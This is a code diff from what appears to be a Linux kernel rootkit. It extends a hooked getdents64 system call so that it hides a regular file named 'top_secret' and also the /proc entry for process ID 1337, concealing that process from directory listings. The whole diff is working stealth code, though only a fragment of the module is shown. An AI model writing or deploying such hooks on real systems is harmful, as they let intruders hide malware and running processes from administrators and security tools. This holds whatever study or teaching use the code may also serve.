@@ -4,6 +4,7 @@
 typedef unsigned long m_address;
 
 #define HIDDEN_FILE_NAME "top_secret"
+#define HIDDEN_PID "1337"
 
 asmlinkage long (*getdents64)(const struct pt_regs *);
 
@@ -29,7 +30,15 @@ asmlinkage static int hook_getdents64(const struct pt_regs *regs)
     {
         current_dir = (void *)modified_dirent + offset;
 
-        if (strcmp(HIDDEN_FILE_NAME, current_dir->d_name) == 0)
+        bool is_hidden_file =
+            current_dir->d_type == DT_REG &&
+            strcmp(HIDDEN_FILE_NAME, current_dir->d_name) == 0;
+
+        bool is_hidden_pid =
+            current_dir->d_type == DT_DIR &&
+            strcmp(HIDDEN_PID, current_dir->d_name) == 0;
+
+        if (is_hidden_file || is_hidden_pid)
         {
             if (current_dir == modified_dirent)
             {
